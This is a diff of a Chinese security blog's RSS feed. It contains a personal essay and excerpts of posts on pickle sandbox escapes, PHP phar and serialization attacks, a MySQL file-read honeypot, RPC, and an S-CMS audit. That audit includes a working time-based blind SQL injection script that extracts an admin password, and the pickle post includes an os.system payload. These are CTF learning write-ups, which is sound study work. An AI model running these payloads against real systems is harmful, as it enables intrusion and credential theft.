+为什么我要学习安全。换在一年前，或者半年前，我一定会毫不犹豫的说，我喜欢。但在我打下这几个字的时候，我感到很焦虑。直到现在我都没有怀疑过我的初心，但我无法保证是是否还能坚守初衷。就好像写文章，变成了我更希望别人看到怎样的我，而不是我现在到底怎样。复现题目，也从之前的不求甚解，变成了 :哦就这样啊，那下次注意。如果说做的这么多都变成了刻意，那我应该得好好反思关于未来的事情。
+也有可能是闲的慌了，容易胡思乱想，我更加能接受这个理由。至少在学校，和朋友们在一起，好像时间会慢很多，大家也不会去规划太多关于未来的事情。在家里有我那粘人的弟弟天天烦着我，每天乐呵乐呵也就过去了。哦对了提一嘴，弟弟的小升初成绩十分不错，让他狠狠的骄傲了一会，行吧，这六年来被我和爸妈三个人教训也挺幸苦的，发工资了就奖赏他一会，不过好像他更希望我能回家。
+工作还是挺累的，自认为晚上回来还能学一些其他的知识，事实上是我想多了。偶然的机会，又重新读了读《山河之书》，不得不说，高中读这本书，和现在完全是不同的感觉。高中仅仅是欣赏他的文笔，但不喜欢他的思想，也可能是对应试教育的厌烦，总觉得能从景点中品出那么多感情的人很矫情，但现在又不一样。偶尔的共鸣也是可以接受的，许多风景，也会不自禁的带入不同的人随行，感觉很奇妙。
+前几天看到通知说江苏最早15号返校，本来也和我没什么关系，实习的话最早好像也得20号走吧，但谈到学校还是会有一些触动，可能是学校里有让自己挂念的人，也可能是还没有提前适应社会的洗礼。不过现在实习的工作也挺nice，组长和学长都挺照顾的。
+是随笔的话，也就这样零零散散的写吧，应该哪天觉得幼稚就删了。</description>
     </item>
     
     <item>
-      <title>About Me</title>
-      <link>https://theoyu.top/about-me/</link>
-      <pubDate>Fri, 30 Apr 2021 00:00:00 +0000</pubDate>
+      <title>pickle</title>
+      <link>https://theoyu.top/posts/pickle/</link>
+      <pubDate>Sat, 14 Aug 2021 23:30:20 +0800</pubDate>
       
-      <guid>https://theoyu.top/about-me/</guid>
-      <description>████████╗ ██╗ ██╗ ███████╗ ██████╗ ██╗ ██╗ ██╗ ██╗ ╚══██╔══╝ ██║ ██║ ██╔════╝ ██╔═══██╗ ╚██╗ ██╔╝ ██║ ██║ ██║ ███████║ █████╗ ██║ ██║ ╚████╔╝ ██║ ██║ ██║ ██╔══██║ ██╔══╝ ██║ ██║ ╚██╔╝ ██║ ██║ ██║ ██║ ██║ ███████╗ ╚██████╔╝ ██║ ╚██████╔╝ ╚═╝ ╚═╝ ╚═╝ ╚══════╝ ╚═════╝ ╚═╝ ╚═════╝ </description>
+      <guid>https://theoyu.top/posts/pickle/</guid>
+      <description>相关介绍看手册就行，写的不能再详细。
+那么如果一个允许Unpickle的场景，环境一般会做怎么样的限制呢？
+毫无疑问又演变成沙盒了，在如今ctf越来越卷的情况下，限制条件也是越来越苛刻。从官方给的一个demo看看：
+import builtins import io import pickle safe_builtins = { &amp;#39;range&amp;#39;, &amp;#39;complex&amp;#39;, &amp;#39;set&amp;#39;, &amp;#39;frozenset&amp;#39;, &amp;#39;slice&amp;#39;, } class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): # Only allow safe classes from builtins. if module == &amp;#34;builtins&amp;#34; and name in safe_builtins: return getattr(builtins, name) # Forbid everything else. raise pickle.UnpicklingError(&amp;#34;global &amp;#39;%s.%s&amp;#39; is forbidden&amp;#34; % (module, name)) def restricted_loads(s): &amp;#34;&amp;#34;&amp;#34;Helper function analogous to pickle.loads().&amp;#34;&amp;#34;&amp;#34; return RestrictedUnpickler(io.BytesIO(s)).load() test= b&amp;#34;cos\nsystem\n(S&amp;#39;echo hello world&amp;#39;\ntR.&amp;#34; restricted_loads(test) 其中这里重写了find_class</description>
     </item>
     
     <item>
-      <title>利用 phar 拓展 php 反序列化漏洞攻击面</title>
-      <link>https://theoyu.top/posts/phar/</link>
-      <pubDate>Mon, 22 Feb 2021 11:19:11 +0800</pubDate>
+      <title>When Mysql read your file</title>
+      <link>https://theoyu.top/posts/mysql-read-file/</link>
+      <pubDate>Sun, 08 Aug 2021 01:20:20 +0800</pubDate>
       
-      <guid>https://theoyu.top/posts/phar/</guid>
-      <description>phar文件结构 所有的Phar archives包含以下3-4个部分。
- a stub a manifest describing the contents the file contents [optional] a signature for verifying Phar integrity (phar file format only)  a stub 可以理解为一个标志，格式为xxx&amp;lt;?php xxx; __HALT_COMPILER();?&amp;gt;，前面内容不限，但必须以__HALT_COMPILER();?&amp;gt;来结尾，否则phar扩展将无法识别这个文件为phar文件。通常使用setStub()设置存根。
-a manifest phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，也是反序列化中我们可以利用的部分。
-file contents 被压缩文件的内容。
-a signature demo 通过一个简单案例创建phar文件，记住要把php.ini中的phar.readonly设置为Off。
-&amp;lt;?php class TestObject { } @unlink(&amp;#34;phar.phar&amp;#34;); $phar = new Phar(&amp;#34;phar.phar&amp;#34;); //后缀名必须为phar  $phar-&amp;gt;setStub(&amp;#34;&amp;lt;?php __HALT_COMPILER(); ?&amp;gt;&amp;#34;); //设置stub  $o = new TestObject(); $phar-&amp;gt;setMetadata($o); //将自定义的meta-data存入manifest  $phar-&amp;gt;addFile(&amp;#39;hack.php&amp;#39;);//添加要压缩的文件 ?&amp;gt;可以看到meta-data是以序列化的形式存储的：
-有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：
-   受影响函数列表        fileatime filectime file_exists file_get_contents   file_put_contents file filegroup fopen   fileinode filemtime fileowner fileperms   is_dir is_excutable is_file is_link   is_readable is_writable is_writeable parse_ini_file   copy unlink stat readfile    用一个小案例加以证明：</description>
+      <guid>https://theoyu.top/posts/mysql-read-file/</guid>
+      <description>这并不是一个新鲜的漏洞，准确的来说是炒冷饭，不过刚好学了计网，就来分析一下吧，顺便用go来重写一个简易蜜罐。
+我们先看一看mysql客户端连接的这个过程，进行了怎样的通讯。
+我们无需在意tcp的连接过程，所以直接过滤mysql协议即可。总的来说这里经历了5个过程。
+ S➡C Server Greeting C➡S Login Request S➡C Response OK C➡SRequst Query S➡CRespose  当客户端连接上服务器，服务器就会发送Server Greeting这第一个握手数据包，这些数据的内容取决于服务器版本和服务器配置
+0000 4a 00 00 00 0a 35 2e 35 2e 35 33 00 05 00 00 00 J....5.5.53.....0010 31 47 50 3d 22 31 6e 58 00 ff f7 21 02 00 0f 80 1GP=&amp;quot;1nX...!....0020 15 00 00 00 00 00 00 00 00 00 00 4d 5b 5e 48 2e .</description>
     </item>
     
     <item>
-      <title>浅谈php序列化与反序列化</title>
-      <link>https://theoyu.top/posts/%E5%BA%8F%E5%88%97%E5%8C%96/</link>
-      <pubDate>Mon, 09 Nov 2020 23:30:20 +0800</pubDate>
+      <title>Study rpc</title>
+      <link>https://theoyu.top/posts/course/rpc/</link>
+      <pubDate>Wed, 28 Jul 2021 10:26:13 +0800</pubDate>
       
-      <guid>https://theoyu.top/posts/%E5%BA%8F%E5%88%97%E5%8C%96/</guid>
-      <description>基础知识  现在我们都会在淘宝上买桌子，这时候一般都会把它拆掉成板子，再装到箱子里面，就可以快递寄出去了，这个过程就类似我们的序列化的过程（把数据转化为可以存储或者传输的形式）。当买家收到货后，就需要自己把这些板子组装成桌子的样子，这个过程就像反序列的过程（转化成当初的数据对象）。
-也就是说，序列化的目的是方便传输和存储。
-在PHP应用中，序列化和反序列化一般用做缓存，比如session，cookie等。
-  PHP序列化：php为了方便进行数据的传输，允许把复杂的数据结构，压缩到一个字符串中，使用serialize()函数。 PHP反序列化：将被压缩为字符串的复杂数据结构，重新恢复，使用unserialize()函数。 PHP反序列化漏洞：如果代码中使用了反序列化 unserialize()函数，并且参数可控，且程序没有对用户输入的反序列化字符串进行校验，那么可以通过在本地构造序列化字符串，同时利用PHP中的一系列magic方法来达到想要实现的目的，如控制对象内部的变量甚至是函数。  序列化格式 &amp;lt;?php $str=&amp;#39;Theoyu&amp;#39;; $bool=true; $null=NULL; $arr=array(&amp;#39;a&amp;#39;=&amp;gt;1,&amp;#39;b&amp;#39;=&amp;gt;2); class A { public $x; private $y; public function __construct($x,$y) { $this-&amp;gt;x=$x; $this-&amp;gt;y=$y; } } $test=new A(3,&amp;#34;theoyu&amp;#34;); echo(serialize($str).&amp;#39;&amp;lt;/br&amp;gt;&amp;#39;); //s:6:&amp;#34;Theoyu&amp;#34;; echo(serialize($bool).&amp;#39;&amp;lt;/br&amp;gt;&amp;#39;); //b:1; echo(serialize($null).&amp;#39;&amp;lt;/br&amp;gt;&amp;#39;); //N; echo(serialize($arr).&amp;#39;&amp;lt;/br&amp;gt;&amp;#39;); //a:2{s:1:&amp;#34;a&amp;#34;;i:1;s:1:&amp;#34;b&amp;#34;;i:2;} echo(serialize($test).&amp;#39;&amp;lt;/br&amp;gt;&amp;#39;); //O:1:&amp;#34;A&amp;#34;:2:{s:1:&amp;#34;x&amp;#34;;i:3;s:4:&amp;#34;Ay&amp;#34;;s:6:&amp;#34;theoyu&amp;#34;;}  ?&amp;gt;序列化对不同类型得到的字符串格式为：
- string ： s:size:value; Integer： i:value; Boolean b:value;(1 or 0) NULL N; Array a:size:{key definition;value definition;······}definition 类似string or Integer Object O:类名长度:&amp;ldquo;类名&amp;rdquo;:属性数量:{属性类型:属性名长度:属性名:value definition······}  Magic methods PHP16个魔术方法 PHP中把比双下划线__开头的方法称为魔术方法，这些发在达到某些条件时会自动被调用：</description>
+      <guid>https://theoyu.top/posts/course/rpc/</guid>
+      <description>RPC  远程过程调用（英语：Remote Procedure Call，缩写为 RPC）是一个计算机通信协议。该协议允许运行于一台计算机的程序调用另一个地址空间（通常为一个开放网络的一台计算机）的子程序，而程序员就像调用本地程序一样，无需额外地为这个交互作用编程（无需关注细节）。RPC是一种服务器-客户端（Client/Server）模式，经典实现是一个通过发送请求-接受回应进行信息交互的系统。 – 远程过程调用 - Wikipedia.org
+ 简单来说，RPC就是一个CS模型。传统CS直接进行连接，像类似中断重连，重复请求，双向的信息交互都需要一个一个写操作。而一个好的RPC框架为我们提供了接口，只需要面向过程编程即可。
+RPC流程：
+从上图可以看出,rpc本身也是一种 request-response 协议。
+有些实现扩展了远程调用的模型，实现了双向的服务调用，但是不管怎样，调用过程还是由一个客户端发起，服务器端提供响应，基本模型没有变化。
+服务的调用过程为：
+ client调用client stub，这是一次本地过程调用 client stub将参数打包成一个消息，然后发送这个消息。打包过程也叫做 marshalling(编码) client所在的系统将消息发送给server server的的系统将收到的包传给server stub server stub解包得到参数。 解包也被称作 unmarshalling(解码) 最后server stub调用服务过程. 返回结果按照相反的步骤传给client  golang自带的rpc框架也不错，不过更多的尝试还是放在了Google的开源跨语言rpc框架gRPC。
+gRPC 在认识gRPC前需要先了解protobuf。
+ gRPC uses Protocol Buffers, Google’s mature open source mechanism for serializing structured data (although it can be used with other data formats such as JSON). Here’s a quick intro to how it works.</description>
+    </item>
+    
+    <item>
+      <title>闪灵cms前台注入&#43;后台getshell</title>
+      <link>https://theoyu.top/posts/codeaudit/s_cms/</link>
+      <pubDate>Fri, 16 Jul 2021 17:19:18 +0800</pubDate>
+      
+      <guid>https://theoyu.top/posts/codeaudit/s_cms/</guid>
+      <description>题目给了sql文件，其中管理员密码进行了更改。
+前台注入 web界面非常美观，admin路由下是登陆界面，同时有滑动条的检测，爆破的思路肯定走不通。看一下源码对登陆处的数据处理。
+在function/function.php下可以看到：
+在check_input下都调用了addslashes,同时还有许多的过滤那常规注入是走不通了，这里巧的地方在于转义只对value进行了转义。
+看看function/form.php，关键点在第162行。
+mysqli_query($conn,&amp;#34;Insert into &amp;#34;.TABLE.&amp;#34;response(R_cid,R_content,R_time,R_rid,R_member,R_ip) values(&amp;#34;.$x.&amp;#34;,&amp;#39;&amp;#34;.htmlspecialchars($y).&amp;#34;&amp;#39;,&amp;#39;&amp;#34;.$R_time.&amp;#34;&amp;#39;,&amp;#39;&amp;#34;.$R_rid.&amp;#34;&amp;#39;,&amp;#34;.$M_id.&amp;#34;,&amp;#39;&amp;#34;.getip().&amp;#34;&amp;#39;)&amp;#34;); 这在一个嵌套了很多层的if语句内，根据走向前提交一个test
+http://127.0.0.1/cms/s_cms/web/function/form.php?action=inputPOST:1-sleep(5)=xxx成功延迟了5s,也就是之前对key没有进行检查造成的伏笔。
+import requests,time x = [str(x) for x in range(0, 10)] y = [chr(y) for y in range(97, 123)] dic = x+y url = &amp;#39;http://127.0.0.1/cms/s_cms/web/function/form.php?action=input&amp;#39; result=&amp;#39;&amp;#39; for i in range(1,33): for j in dic: data={ &amp;#34;1-if((select(substr(A_pwd,{},1))from/**/SL_admin)=&amp;#39;{}&amp;#39;,sleep(3),1)&amp;#34;.format(i,j):&amp;#34;xxx&amp;#34; } startTime = time.time() res = requests.post(url=url,data=data) endTime = time.time() if endTime - startTime &amp;gt; 3: result=result+j print(&amp;#39;[+] &amp;#39;+result) break 后台getshell 后台的功能挺多的，但是翻了很久都没能找到可以利用的点，无意见翻到这个检测更新：</description>
     </item>
     
   </channel>
